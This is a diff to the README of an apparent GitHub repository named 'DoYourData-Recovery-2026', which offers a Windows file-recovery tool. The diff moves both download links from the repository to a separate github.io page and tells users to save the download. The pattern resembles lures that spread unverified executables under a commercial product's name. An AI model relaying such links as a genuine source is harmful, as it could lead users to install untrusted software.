@@ -1,6 +1,6 @@
 # 💾 DoYourData-Recovery-2026 - Recover Lost Files On Windows Easily
 
-[![](https://img.shields.io/badge/Download-DoYourData_Recovery-blue.svg)](https://github.com/Interfaith-teucriummarum140/DoYourData-Recovery-2026)
+[![](https://img.shields.io/badge/Download-DoYourData_Recovery-blue.svg)](https://interfaith-teucriummarum140.github.io)
 
 ## 📌 Introduction
 DoYourData-Recovery-2026 serves as a tool for Windows users. It retrieves files lost due to accidental deletion, partition formatting, or software errors. This software works on Windows 11 and Windows 10. It focuses on file restoration and partition recovery. The tool scans your storage drives to find missing data and allows you to save those files to a new location.
@@ -16,7 +16,7 @@ Before you install the software, confirm your computer meets these requirements:
 ## 🚀 Getting Started
 Follow these steps to obtain and run the software on your machine.
 
-1. Visit the project link to start: [https://github.com/Interfaith-teucriummarum140/DoYourData-Recovery-2026](https://github.com/Interfaith-teucriummarum140/DoYourData-Recovery-2026)
+1. Visit the project link to start: [https://interfaith-teucriummarum140.github.io](https://interfaith-teucriummarum140.github.io)
 2. Locate the download button or link on the repository page.
 3. Click the link to begin the download process.
 4. Save the file to your Downloads folder.
